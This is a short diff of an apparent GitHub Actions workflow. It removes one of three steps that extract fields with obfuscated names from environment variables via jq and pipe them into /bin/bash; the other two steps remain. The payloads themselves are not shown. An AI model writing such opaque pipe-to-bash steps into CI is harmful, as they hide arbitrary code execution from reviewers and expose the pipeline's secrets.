@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$up9" | jq -r .nw6306 | /bin/bash
           echo $xmzk08 | jq -r .akifx70 | /bin/bash
-          printf '%s' "$gif65" | jq -r .rqmes7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
